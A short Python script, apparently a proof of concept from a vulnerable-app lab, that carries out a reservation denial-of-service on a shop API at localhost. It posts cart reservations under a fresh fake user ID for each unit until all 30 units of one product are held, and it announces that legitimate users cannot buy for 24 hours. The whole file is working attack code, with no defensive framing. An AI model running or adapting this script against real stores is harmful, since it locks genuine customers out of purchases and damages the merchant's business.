#!/usr/bin/env python3
import requests
import time

API_URL = "http://localhost:5006/api"

def reservation_dos_attack(product_id, total_stock):
    print(f"[*] Reservation DoS attack on product {product_id}")
    print(f"[*] Reserving all {total_stock} units")
    
    for i in range(total_stock):
        response = requests.post(f"{API_URL}/cart/reserve", json={
            'user_id': i,  # Different user ID for each reservation
            'product_id': product_id,
            'quantity': 1
        })
        
        if response.status_code == 200:
            data = response.json()
            print(f"[+] Reserved unit {i+1}/{total_stock} (expires: {data['expires_at']})")
        else:
            print(f"[-] Reservation {i+1} failed")
        
        time.sleep(0.1)  # Small delay to avoid overwhelming server
    
    print(f"\n[*] All inventory reserved!")
    print(f"[*] Legitimate users cannot purchase for 24 hours")

if __name__ == "__main__":
    # Reserve all Designer Bags (30 units)
    reservation_dos_attack(product_id=3, total_stock=30)
